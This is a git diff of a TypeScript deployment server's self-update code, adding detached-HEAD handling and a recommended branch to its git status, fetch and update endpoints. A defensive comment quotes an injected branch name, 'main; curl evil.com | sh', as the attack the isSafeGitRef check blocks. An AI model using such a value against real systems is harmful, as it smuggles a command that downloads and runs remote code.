@@ -30,7 +30,12 @@ import { discoverComposeFiles, parseComposeFile, parseComposeString, resolveEnvT
 import type { ComposeServiceDef } from '../services/compose-parser.js';
 import { computeRequiredInfra } from '../services/deploy-infra-resolver.js';
 import { normalizeProjectProfileDependencies } from '../services/project-profile-dependencies.js';
-import { checkoutSelfUpdateTarget, resolveSelfUpdateTargetBranch } from '../services/self-update-checkout.js';
+import {
+  checkoutSelfUpdateTarget,
+  recommendSelfUpdateTargetBranch,
+  resolveRemoteDefaultBranch,
+  resolveSelfUpdateTargetBranch,
+} from '../services/self-update-checkout.js';
 import { combinedOutput } from '../types.js';
 import { topoSortLayers } from '../services/topo-sort.js';
 import { detectStack, type DatabaseInitRecommendation, type StackDetection } from '../services/stack-detector.js';
@@ -548,7 +553,18 @@ async function computeSelfStatusPayload(
     }
   };
 
-  const currentBranch = resolveSelfUpdateTargetBranch(await safeExec('git rev-parse --abbrev-ref HEAD'));
+  const rawCurrentBranch = await safeExec('git rev-parse --abbrev-ref HEAD');
+  const currentBranch = resolveSelfUpdateTargetBranch(rawCurrentBranch);
+  const detachedHead = rawCurrentBranch.trim() === 'HEAD';
+  const remoteDefaultBranch = resolveRemoteDefaultBranch(
+    await safeExec('git symbolic-ref --quiet --short refs/remotes/origin/HEAD'),
+  );
+  const recommendedBranch = recommendSelfUpdateTargetBranch(
+    currentBranch,
+    [],
+    remoteDefaultBranch,
+  );
+  const comparisonBranch = currentBranch || recommendedBranch;
   const headSha = await safeExec('git rev-parse --short HEAD');
   const headIso = await safeExec('git log -1 --format=%cI HEAD');
 
@@ -558,7 +574,7 @@ async function computeSelfStatusPayload(
   // 损坏 ref / 老 git 版本边界 case 漏网,后续 `git fetch origin ${branch}`
   // 等命令会通过 child_process.exec 让 metacharacter 改变命令行为。
   // self-update / self-force-sync 路径已用 isSafeGitRef 守门,这里补齐。
-  const branchIsSafe = currentBranch && isSafeGitRef(currentBranch);
+  const branchIsSafe = comparisonBranch && isSafeGitRef(comparisonBranch);
 
   let fetchOk = true;
   let fetchError = '';
@@ -575,7 +591,7 @@ async function computeSelfStatusPayload(
       const fetchResult = await fetchWithLockRetry(
         shell,
         repoRoot,
-        currentBranch,
+        comparisonBranch,
         { timeoutMs: 5_000, env },
       );
       if (fetchResult.exitCode !== 0) {
@@ -586,13 +602,13 @@ async function computeSelfStatusPayload(
       fetchOk = false;
       fetchError = (err as Error).message;
     }
-  } else if (!currentBranch) {
+  } else if (!comparisonBranch) {
     fetchOk = false;
-    fetchError = 'currentBranch unknown — skipped fetch';
+    fetchError = 'comparisonBranch unknown — skipped fetch';
   } else {
     fetchOk = false;
-    fetchError = `currentBranch ${JSON.stringify(currentBranch).slice(0, 80)} 含不安全字符,跳过 git fetch`;
-    degradedReasons.push('currentBranch unsafe — fetch/diff skipped');
+    fetchError = `comparisonBranch ${JSON.stringify(comparisonBranch).slice(0, 80)} 含不安全字符,跳过 git fetch`;
+    degradedReasons.push('comparisonBranch unsafe — fetch/diff skipped');
   }
 
   let remoteAheadCount = 0;
@@ -600,7 +616,7 @@ async function computeSelfStatusPayload(
   const remoteAheadSubjects: Array<{ sha: string; subject: string; date: string }> = [];
   if (branchIsSafe) {
     const counts = await safeExec(
-      `git rev-list --left-right --count HEAD...origin/${currentBranch}`,
+      `git rev-list --left-right --count HEAD...origin/${comparisonBranch}`,
       { cwd: repoRoot, timeout: 5_000 },
     );
     if (counts) {
@@ -610,7 +626,7 @@ async function computeSelfStatusPayload(
     }
     if (remoteAheadCount > 0) {
       const log = await safeExec(
-        `git log --format='%h%x1f%cI%x1f%s' -n 5 HEAD..origin/${currentBranch}`,
+        `git log --format='%h%x1f%cI%x1f%s' -n 5 HEAD..origin/${comparisonBranch}`,
         { cwd: repoRoot, timeout: 5_000 },
       );
       if (log) {
@@ -723,6 +739,8 @@ async function computeSelfStatusPayload(
 
   return {
     currentBranch,
+    detachedHead,
+    recommendedBranch,
     headSha,
     headIso,
     fetchOk,
@@ -20111,7 +20129,7 @@ python3 <项目技能目录>/cds/cli/cdscli.py connect --host https://<cds-host>
     let currentBranch = '';
     try {
       const currentResult = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: config.repoRoot });
-      currentBranch = currentResult.stdout.trim();
+      currentBranch = resolveSelfUpdateTargetBranch(currentResult.stdout);
     } catch {
       // 拿不到 currentBranch 也不致命,cdsTouched 全部置 false
     }
@@ -20125,7 +20143,7 @@ python3 <项目技能目录>/cds/cli/cdscli.py connect --host https://<cds-host>
     // 然后 JS 用 '\x1f'(单个真 0x1F)split。
     const refResult = await shell.exec(
       `git for-each-ref --sort=-committerdate ` +
-      `--format='%(refname:short)%1f%(committerdate:iso8601-strict)%1f%(objectname:short)%1f%(subject)' ` +
+      `--format='%(refname:short)%1f%(committerdate:iso8601-strict)%1f%(objectname:short)%1f%(subject)%1f%(symref)' ` +
       `refs/remotes/origin/`,
       { cwd: config.repoRoot, timeout: 30_000 },
     );
@@ -20136,9 +20154,11 @@ python3 <项目技能目录>/cds/cli/cdscli.py connect --host https://<cds-host>
       if (!line.trim()) continue;
       const parts = line.split('\x1f');
       if (parts.length < 4) continue;
+      const symref = (parts[4] || '').trim();
+      if (symref) continue;
       let name = parts[0].trim();
       if (name.startsWith('origin/')) name = name.slice('origin/'.length);
-      if (name === 'HEAD' || name.includes('HEAD ->')) continue;
+      if (!name || name === 'HEAD' || name === 'origin' || name.includes('HEAD ->')) continue;
       if (seen.has(name)) continue;
       seen.add(name);
       branches.push({
@@ -20150,14 +20170,19 @@ python3 <项目技能目录>/cds/cli/cdscli.py connect --host https://<cds-host>
       });
     }
 
-    // cdsTouched 只对 top 30 算,避免慢
+    // cdsTouched 只对 top 30 算,避免慢。游离 HEAD 时以推荐目标为比较基线，
+    // 不能因为 currentBranch 为空就把所有候选误标成“未改 CDS”。
+    const comparisonBranch = recommendSelfUpdateTargetBranch(
+      currentBranch,
+      branches.map((branch) => branch.name),
+    );
     const top = branches.slice(0, 30);
     await Promise.all(
       top.map(async (b) => {
-        if (!currentBranch || b.name === currentBranch) return;
+        if (!comparisonBranch || b.name === comparisonBranch) return;
         try {
           const diff = await shell.exec(
-            `git log --format=%H -n 1 origin/${currentBranch}..origin/${b.name} -- cds/`,
+            `git log --format=%H -n 1 origin/${comparisonBranch}..origin/${b.name} -- cds/`,
             { cwd: config.repoRoot, timeout: 5_000 },
           );
           b.cdsTouched = diff.stdout.trim().length > 0;
@@ -20184,6 +20209,7 @@ python3 <项目技能目录>/cds/cli/cdscli.py connect --host https://<cds-host>
         : lastKnownGood?.remoteBranches ?? [];
 
     const currentBranch = snapshot.currentBranch || lastKnownGood?.currentBranch || '';
+    const detachedHead = snapshot.detachedHead || lastKnownGood?.detachedHead || false;
     const commitHash = snapshot.headSha || lastKnownGood?.headSha || '';
     const currentCommitterDate = snapshot.headIso || lastKnownGood?.headIso || '';
 
@@ -20202,6 +20228,12 @@ python3 <项目技能目录>/cds/cli/cdscli.py connect --host https://<cds-host>
       lastKnownGood: usingLastKnownGood ? { fromTs: lastKnownGood?.lastRefreshAt } : null,
       // 主体数据:即使 degraded 也尽量给前端能用的字段(可能是空数组)
       current: currentBranch,
+      detached: detachedHead,
+      recommended: recommendSelfUpdateTargetBranch(
+        currentBranch,
+        branchSource.map((branch) => branch.name),
+        snapshot.recommendedBranch || lastKnownGood?.recommendedBranch || '',
+      ),
       commitHash,
       currentCommitterDate,
       branchDetails: branchSource,
@@ -20534,14 +20566,19 @@ python3 <项目技能目录>/cds/cli/cdscli.py connect --host https://<cds-host>
       resolveActorFromRequest(req) ||
       'unknown';
 
-    branch = typeof branch === 'string' ? branch.trim() : '';
+    branch = resolveSelfUpdateTargetBranch(typeof branch === 'string' ? branch : '');
     if (!branch) {
       try {
-        const currentBranch = (await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: config.repoRoot }))
-          .stdout.trim();
-        branch = currentBranch && currentBranch !== 'HEAD'
-          ? resolveSelfUpdateTargetBranch(currentBranch)
-          : 'main';
+        const currentBranch = resolveSelfUpdateTargetBranch(
+          (await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: config.repoRoot })).stdout,
+        );
+        const remoteDefaultBranch = resolveRemoteDefaultBranch(
+          (await shell.exec(
+            'git symbolic-ref --quiet --short refs/remotes/origin/HEAD',
+            { cwd: config.repoRoot },
+          )).stdout,
+        );
+        branch = recommendSelfUpdateTargetBranch(currentBranch, [], remoteDefaultBranch);
       } catch {
         branch = 'main';
       }
@@ -21429,10 +21466,14 @@ python3 <项目技能目录>/cds/cli/cdscli.py connect --host https://<cds-host>
       // Reject shell-unsafe refs up front — the endpoint is auth-gated
       // but defense-in-depth against an attacker with a valid AI key
       // crafting `branch='main; curl evil.com | sh'` is cheap.
-      let target = branch;
+      let target = resolveSelfUpdateTargetBranch(branch || '');
       if (!target) {
         const cur = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot });
-        target = resolveSelfUpdateTargetBranch(cur.stdout.trim() || 'main');
+        const remoteDefault = await shell.exec(
+          'git symbolic-ref --quiet --short refs/remotes/origin/HEAD',
+          { cwd: repoRoot },
+        );
+        target = recommendSelfUpdateTargetBranch(cur.stdout, [], remoteDefault.stdout);
       }
       if (!isSafeGitRef(target)) {
         send('resolve', 'error', `拒绝不安全分支名: ${target.slice(0, 80)}`);
